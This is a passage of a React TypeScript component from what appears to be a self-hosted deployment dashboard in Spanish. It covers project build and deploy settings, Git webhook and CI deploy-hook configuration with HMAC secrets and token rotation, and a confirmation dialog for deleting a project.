                    preDeployCommand: preDeployVal || null,
                    postDeployCommand: postDeployVal || null,
                    baseDirectory: formData.get('baseDirectory'),
                    watchPaths: wp.split(',').map((s) => s.trim()).filter(Boolean),
                    ...(Number.isFinite(memRaw) && memRaw >= 64 ? { memoryMb: memRaw } : {}),
                    ...(cpuRaw ? { cpus: cpuRaw } : {}),
                    autoRollback: formData.get('autoRollback') === 'on',
                  };
                  try {
                    await api.updateProject(projectId, updates);
                    setConfigDirty(false);
                    onNotify('Configuración guardada correctamente', 'success');
                    await fetchProject();
                    onProjectUpdate?.();
                  } catch (err: any) {
                    onNotify(err?.message || 'Error al guardar configuración', 'error');
                  }
                }}
                className="space-y-4"
              >
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="sm:col-span-2">
                    <label className="block text-xs font-medium text-slate-700 mb-1">Nombre</label>
                    <input name="name" defaultValue={project.name} required className="w-full px-3 py-2 border border-slate-200 rounded-lg text-sm" />
                  </div>
                  <div className="sm:col-span-2">
                    <label className="block text-xs font-medium text-slate-700 mb-1">Descripción</label>
                    <textarea name="description" defaultValue={project.description} className="w-full px-3 py-2 border border-slate-200 rounded-lg text-sm" rows={2} />
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-slate-700 mb-1">URL del repositorio Git</label>
                    <input name="gitRepo" defaultValue={project.gitRepo} className="w-full px-3 py-2 border border-slate-200 rounded-lg text-sm font-mono" placeholder="https://github.com/usuario/repo" />
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-slate-700 mb-1">Rama</label>
                    <input name="gitBranch" defaultValue={project.gitBranch} className="w-full px-3 py-2 border border-slate-200 rounded-lg text-sm font-mono" placeholder="main" />
                  </div>
                  <div className="sm:col-span-2">
                    <label className="block text-xs font-medium text-slate-700 mb-1">Carpeta local vinculada (opcional)</label>
                    <input name="localPath" defaultValue={project.localPath || ''} className="w-full px-3 py-2 border border-slate-200 rounded-lg text-sm font-mono" placeholder="C:\proyectos\mi-app o /srv/mi-app" />
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-slate-700 mb-1">Directorio base</label>
                    <input name="baseDirectory" defaultValue={project.baseDirectory} className="w-full px-3 py-2 border border-slate-200 rounded-lg text-sm font-mono" placeholder="/" />
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-slate-700 mb-1">Rutas vigiladas</label>
                    <input name="watchPaths" defaultValue={(project.watchPaths || []).join(', ')} className="w-full px-3 py-2 border border-slate-200 rounded-lg text-sm font-mono" placeholder="src/**, public/**" />
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-slate-700 mb-1">Comando de compilación</label>
                    <input name="buildCommand" defaultValue={project.buildCommand} className="w-full px-3 py-2 border border-slate-200 rounded-lg text-sm font-mono" placeholder="npm run build" />
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-slate-700 mb-1">Comando de inicio</label>
                    <input name="startCommand" defaultValue={project.startCommand} className="w-full px-3 py-2 border border-slate-200 rounded-lg text-sm font-mono" placeholder="npm start" />
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-slate-700 mb-1">Hook pre-despliegue (migraciones)</label>
                    <input name="preDeployCommand" defaultValue={project.preDeployCommand || ''} className="w-full px-3 py-2 border border-slate-200 rounded-lg text-sm font-mono" placeholder="npx prisma migrate deploy" />
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-slate-700 mb-1">Hook post-despliegue</label>
                    <input name="postDeployCommand" defaultValue={project.postDeployCommand || ''} className="w-full px-3 py-2 border border-slate-200 rounded-lg text-sm font-mono" placeholder="npm run cache:warm" />
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-slate-700 mb-1">Límite de memoria (MB)</label>
                    <input name="memoryMb" type="number" min={64} max={65536} defaultValue={project.memoryMb || 512} className="w-full px-3 py-2 border border-slate-200 rounded-lg text-sm font-mono tabular-nums" />
                  </div>
                  <div>
                    <label className="block text-xs font-medium text-slate-700 mb-1">Límite de CPU (vCPU)</label>
                    <input name="cpus" defaultValue={String(project.cpus ?? '1')} className="w-full px-3 py-2 border border-slate-200 rounded-lg text-sm font-mono tabular-nums" placeholder="1.0" />
                  </div>
                  <div className="sm:col-span-2 pt-1">
                    <label className="inline-flex items-center gap-2 text-xs text-slate-700 cursor-pointer">
                      <input
                        type="checkbox"
                        name="autoRollback"
                        defaultChecked={Boolean(project.autoRollback)}
                        className="rounded border-slate-300 accent-slate-900"
                      />
                      <span>Reversión automática si el contenedor cae por OOM o entra en bucle de reinicios</span>
                    </label>
                  </div>
                </div>
                <div className="flex justify-end pt-3 border-t border-slate-100">
                  <button
                    type="submit"
                    className="px-4 py-2 bg-slate-900 hover:bg-slate-800 text-white rounded-lg text-xs font-medium inline-flex items-center gap-1.5 cursor-pointer"
                  >
                    <Save className="w-3.5 h-3.5" /> Guardar configuración
                  </button>
                </div>
              </form>
            </div>

            {/* Webhooks Multi-Git y Deploy Hook CI/CD */}
            <div className="bg-white p-5 rounded-xl border border-slate-200 space-y-4">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <div className="flex items-center gap-3">
                  <div className="w-9 h-9 bg-slate-100 text-slate-700 rounded-lg border border-slate-200 flex items-center justify-center shrink-0">
                    <Webhook className="w-4 h-4" />
                  </div>
                  <div>
                    <h2 className="font-semibold text-slate-900 text-sm flex items-center gap-1.5">
                      <span>Webhooks Git y Deploy Hook CI/CD</span>
                      <HelpTip title="Webhooks y Deploy Hooks">
                        <p>Permiten desplegar automáticamente en cada <code className="font-mono">git push</code> desde GitHub, GitLab, Gitea o Bitbucket.</p>
                        <p>Con <strong>Deploy Hook</strong> puedes lanzar un despliegue desde GitHub Actions o cualquier script con un simple <code className="font-mono">curl -X POST</code>.</p>
                      </HelpTip>
                    </h2>
                    <p className="text-xs text-slate-500">
                      Firma HMAC verificada, filtrado por rama y rutas de monorepo.
                    </p>
                  </div>
                </div>

                <button
                  type="button"
                  onClick={async () => {
                    const nextState = project.autoDeploy === false;
                    try {
                      await api.updateProject(projectId, { autoDeploy: nextState });
                      onNotify(`Despliegue automático ${nextState ? 'activado' : 'desactivado'}`, 'success');
                      await fetchProject();
                    } catch (err: any) {
                      onNotify(err?.message || 'Error al actualizar estado', 'error');
                    }
                  }}
                  className={`px-3 py-1.5 rounded-full text-xs font-medium inline-flex items-center gap-1.5 border cursor-pointer ${
                    project.autoDeploy !== false
                      ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                      : 'bg-slate-100 text-slate-600 border-slate-200'
                  }`}
                >
                  <span className={`w-1.5 h-1.5 rounded-full ${project.autoDeploy !== false ? 'bg-emerald-500' : 'bg-slate-400'}`} />
                  {project.autoDeploy !== false ? 'Activo' : 'Desactivado'}
                </button>
              </div>

              <div className="flex items-center gap-1 bg-slate-100 p-1 rounded-lg border border-slate-200 overflow-x-auto no-scrollbar text-xs">
                {([
                  { id: 'github', label: 'GitHub' },
                  { id: 'gitlab', label: 'GitLab' },
                  { id: 'gitea', label: 'Gitea / Forgejo' },
                  { id: 'bitbucket', label: 'Bitbucket' },
                  { id: 'deploy_hook', label: 'Deploy Hook (CI/CD)' },
                ] as const).map((prov) => (
                  <button
                    key={prov.id}
                    type="button"
                    onClick={() => setWebhookProvider(prov.id)}
                    className={`px-2.5 py-1.5 rounded-md font-medium whitespace-nowrap transition-colors cursor-pointer ${
                      webhookProvider === prov.id
                        ? 'bg-white text-slate-900 shadow-2xs'
                        : 'text-slate-600 hover:text-slate-900'
                    }`}
                  >
                    {prov.label}
                  </button>
                ))}
              </div>

              {webhookProvider === 'deploy_hook' ? (
                <div className="space-y-3.5">
                  <div className="flex items-center justify-between gap-2">
                    <span className="text-xs font-medium text-slate-700">Endpoint firmado para CI/CD</span>
                    <button
                      type="button"
                      disabled={rotatingHook}
                      onClick={async () => {
                        setRotatingHook(true);
                        try {
                          await api.rotateDeployHook(project.id);
                          onNotify('Token de Deploy Hook rotado correctamente', 'success');
                          await fetchProject();
                        } catch (err: any) {
                          onNotify(err?.message || 'No se pudo rotar el token', 'error');
                        } finally {
                          setRotatingHook(false);
                        }
                      }}
                      className="text-xs text-slate-600 hover:text-slate-900 font-medium inline-flex items-center gap-1 underline cursor-pointer disabled:opacity-50"
                    >
                      <KeyRound className="w-3 h-3" /> {rotatingHook ? 'Rotando…' : project.deployHookToken ? 'Rotar token' : 'Generar token'}
                    </button>
                  </div>
                  {project.deployHookToken ? (
                    <>
                      <div className="flex gap-2">
                        <input
                          type="text"
                          readOnly
                          value={`${window.location.origin}/api/webhooks/deploy/${project.id}?token=${project.deployHookToken}`}
                          className="flex-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-lg text-xs font-mono text-slate-700 select-all"
                        />
                        <button
                          type="button"
                          onClick={() => void copyValue(`${window.location.origin}/api/webhooks/deploy/${project.id}?token=${project.deployHookToken}`, 'Deploy Hook copiado')}
                          className="px-3 py-2 bg-slate-100 hover:bg-slate-200 text-slate-700 font-medium rounded-lg text-xs inline-flex items-center gap-1.5 cursor-pointer shrink-0"
                        >
                          <Copy className="w-3.5 h-3.5" /> Copiar
                        </button>
                      </div>
                      <div className="p-3 bg-slate-900 text-slate-100 rounded-lg text-[11px] font-mono overflow-x-auto flex items-center justify-between gap-2">
                        <code className="truncate">
                          {`curl -X POST "${window.location.origin}/api/webhooks/deploy/${project.id}" -H "X-Deploy-Token: ${project.deployHookToken}"`}
                        </code>
                        <button
                          type="button"
                          onClick={() => void copyValue(`curl -X POST "${window.location.origin}/api/webhooks/deploy/${project.id}" -H "X-Deploy-Token: ${project.deployHookToken}"`, 'Comando curl copiado')}
                          className="px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 shrink-0 cursor-pointer"
                        >
                          Copiar curl
                        </button>
                      </div>
                    </>
                  ) : (
                    <div className="p-4 bg-slate-50 border border-slate-200 rounded-lg text-xs text-slate-500">
                      Todavía no hay token de Deploy Hook generado para este proyecto. Pulsa «Generar token» arriba para activarlo.
                    </div>
                  )}
                </div>
              ) : (
              <div className="space-y-3.5">
                <div>
                  <label className="block text-xs font-medium text-slate-700 mb-1">Payload URL ({webhookProvider})</label>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      readOnly
                      value={`${window.location.origin}/api/webhooks/${webhookProvider}?projectId=${project.id}`}
                      className="flex-1 px-3 py-2 bg-slate-50 border border-slate-200 rounded-lg text-xs font-mono text-slate-700 select-all"
                    />
                    <button
                      type="button"
                      onClick={() => {
                        void copyValue(`${window.location.origin}/api/webhooks/${webhookProvider}?projectId=${project.id}`, 'URL del webhook copiada');
                        setCopiedUrl(true);
                        window.setTimeout(() => setCopiedUrl(false), 2000);
                      }}
                      className="px-3 py-2 bg-slate-100 hover:bg-slate-200 text-slate-700 font-medium rounded-lg text-xs inline-flex items-center gap-1.5 cursor-pointer shrink-0"
                    >
                      {copiedUrl ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
                      {copiedUrl ? 'Copiado' : 'Copiar'}
                    </button>
                  </div>
                  <p className="text-[11px] text-slate-500 mt-1">
                    {webhookProvider === 'github' && 'Configura Content-Type como application/json y pega el secreto HMAC abajo.'}
                    {webhookProvider === 'gitlab' && 'En GitLab → Settings → Webhooks, pega el secreto en el campo «Secret token» (X-Gitlab-Token).'}
                    {webhookProvider === 'gitea' && 'En Gitea/Forgejo → Webhooks, usa formato JSON y pega el secreto (X-Gitea-Signature).'}
                    {webhookProvider === 'bitbucket' && 'En Bitbucket → Webhooks, añade el secreto compartido (X-Hub-Signature).'}
                  </p>
                </div>

                <div>
                  <div className="flex justify-between items-center mb-1">
                    <label className="block text-xs font-medium text-slate-700">Secreto compartido / HMAC</label>
                    <button
                      type="button"
                      onClick={async () => {
                        const newSecret = Array.from(crypto.getRandomValues(new Uint8Array(16)))
                          .map((b) => b.toString(16).padStart(2, '0'))
                          .join('');
                        try {
                          await api.updateProject(projectId, { webhookSecret: newSecret });
                          onNotify('Secreto de webhook regenerado', 'success');
                          await fetchProject();
                        } catch (err: any) {
                          onNotify(err?.message || 'Error al regenerar secreto', 'error');
                        }
                      }}
                      className="text-xs text-slate-600 hover:text-slate-900 font-medium inline-flex items-center gap-1 underline cursor-pointer"
                    >
                      <RefreshCw className="w-3 h-3" /> Regenerar
                    </button>
                  </div>
                  <div className="flex gap-2">
                    <div className="relative flex-1">
                      <input
                        type={showSecret ? 'text' : 'password'}
                        readOnly
                        value={project.webhookSecret || ''}
                        placeholder="Genera un secreto para firmar las entregas"
                        className="w-full px-3 py-2 pr-9 bg-slate-50 border border-slate-200 rounded-lg text-xs font-mono text-slate-700"
                      />
                      <button
                        type="button"
                        aria-label={showSecret ? 'Ocultar secreto' : 'Mostrar secreto'}
                        onClick={() => setShowSecret(!showSecret)}
                        className="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-700 cursor-pointer"
                      >
                        {showSecret ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                      </button>
                    </div>
                    <button
                      type="button"
                      disabled={!project.webhookSecret}
                      onClick={() => {
                        if (!project.webhookSecret) return;
                        void copyValue(project.webhookSecret, 'Secreto copiado');
                        setCopiedSecret(true);
                        window.setTimeout(() => setCopiedSecret(false), 2000);
                      }}
                      className="px-3 py-2 bg-slate-100 hover:bg-slate-200 text-slate-700 font-medium rounded-lg text-xs inline-flex items-center gap-1.5 disabled:opacity-40 cursor-pointer shrink-0"
                    >
                      {copiedSecret ? <Check className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
                      {copiedSecret ? 'Copiado' : 'Copiar'}
                    </button>
                  </div>
                </div>

                <div className="flex flex-col sm:flex-row sm:items-center justify-between p-3 bg-slate-50 rounded-lg border border-slate-200 gap-2 text-xs">
                  <span className="text-slate-600">
                    Rama vigilada: <strong className="font-mono text-slate-900">{project.gitBranch || 'main'}</strong>
                  </span>
                  <button
                    type="button"
                    onClick={() => void handleSimulatePush()}
                    disabled={simulatingWebhook}
                    className="px-3 py-1.5 bg-white hover:bg-slate-100 border border-slate-200 text-slate-700 font-medium rounded-lg text-xs inline-flex items-center gap-1.5 disabled:opacity-50 cursor-pointer self-start sm:self-auto"
                  >
                    <RefreshCw className={`w-3.5 h-3.5 ${simulatingWebhook ? 'animate-spin' : ''}`} />
                    {simulatingWebhook ? 'Probando…' : 'Probar webhook'}
                  </button>
                </div>

                {project.lastCommit && (
                  <div className="p-3 bg-emerald-50 border border-emerald-200 rounded-lg text-xs space-y-1">
                    <div className="font-medium text-emerald-900 flex items-center gap-1.5">
                      <CheckCircle2 className="w-3.5 h-3.5 text-emerald-600" />
                      Última entrega procesada
                    </div>
                    <div className="text-slate-700">
                      <span className="font-mono bg-white px-1.5 py-0.5 rounded border border-emerald-200 text-emerald-800 mr-1.5">
                        {project.lastCommit.sha}
                      </span>
                      {project.lastCommit.message}
                    </div>
                    <div className="text-[11px] text-slate-500">
                      {project.lastCommit.author} · {new Date(project.lastCommit.timestamp).toLocaleString('es-ES')}
                    </div>
                  </div>
                )}

                {window.location.hostname === 'localhost' && (
                  <p className="text-[11px] text-slate-500 bg-slate-50 border border-slate-200 rounded-lg p-3 leading-relaxed">
                    En entornos locales, para recibir webhooks reales desde Git publica el panel mediante un dominio HTTPS o un túnel de Cloudflare en Ajustes.
                  </p>
                )}
              </div>
              )}
            </div>

            {/* Zona de peligro */}
            <div className="bg-white p-5 rounded-xl border border-red-200 space-y-3">
              <h2 className="font-semibold text-red-700 flex items-center gap-2 text-base">
                <ShieldAlert className="w-4 h-4" /> Zona de peligro
              </h2>
              <p className="text-xs text-slate-600 max-w-2xl leading-relaxed">
                Eliminar este proyecto detendrá todos sus contenedores, retirará sus rutas públicas y eliminará sus variables y volúmenes. Esta acción no se puede deshacer.
              </p>
              <button
                type="button"
                onClick={() => { setConfirmDeleteName(''); setShowDeleteDialog(true); }}
                className="px-4 py-2 bg-red-50 hover:bg-red-100 text-red-700 border border-red-200 rounded-lg text-xs font-medium inline-flex items-center gap-1.5 cursor-pointer"
              >
                <Trash2 className="w-3.5 h-3.5" /> Eliminar proyecto
              </button>
            </div>
          </div>
        )}
      </div>

      {/* Modal de borrado definitivo */}
      <Modal
        open={showDeleteDialog}
        onClose={() => !deleting && setShowDeleteDialog(false)}
        title={`Eliminar «${project.name}»`}
        subtitle="Esta acción es irreversible."
        maxWidthClass="max-w-lg"
        closeDisabled={deleting}
      >
        <form
          onSubmit={(e) => {
            e.preventDefault();
            void handleDelete();
          }}
          className="p-5 space-y-4"
        >
          <ul className="text-xs text-slate-700 space-y-1.5 bg-slate-50 border border-slate-200 rounded-xl p-4 leading-relaxed">
            <li>· Se detienen y eliminan los contenedores de desarrollo y producción.</li>
            <li>· Se eliminan las <strong>{Object.keys(project.envVars || {}).length}</strong> variables de entorno.</li>
            <li>· Se borran los volúmenes persistentes configurados.</li>
            <li>
              · Se desvinculan <strong>{domainCount}</strong> {domainCount === 1 ? 'dominio' : 'dominios'} y se retiran sus rutas públicas
              {domainCount > 0 && <span className="text-slate-500"> ({(project.domains || []).join(', ')})</span>}.
            </li>
            <li>· Se descarta el historial de despliegues.</li>
          </ul>

          <label className="block text-xs">
            <span className="text-slate-600">
              Escribe <strong className="font-mono text-slate-900">{project.name}</strong> para confirmar:
            </span>
            <input
              autoFocus
              type="text"
              value={confirmDeleteName}
              onChange={(e) => setConfirmDeleteName(e.target.value)}
              placeholder={project.name}
              className="w-full border border-slate-200 rounded-lg px-3 py-2 mt-1.5 text-slate-900 font-mono text-sm"
            />
          </label>

          <div className="flex justify-end gap-2 pt-1">
            <button
              type="button"
              onClick={() => setShowDeleteDialog(false)}
              disabled={deleting}
              className="text-xs font-medium text-slate-600 border border-slate-200 px-3.5 py-2 rounded-lg hover:bg-slate-50 cursor-pointer"
            >
              Cancelar
            </button>
            <button
              type="submit"
              disabled={deleting || confirmDeleteName.trim() !== project.name}
              className="inline-flex items-center gap-1.5 text-xs font-medium bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700 disabled:opacity-40 disabled:cursor-not-allowed cursor-pointer"
            >
              <Trash2 className="w-3.5 h-3.5" /> {deleting ? 'Eliminando…' : 'Eliminar proyecto'}
            </button>
          </div>
        </form>
      </Modal>
    </div>
  );
};
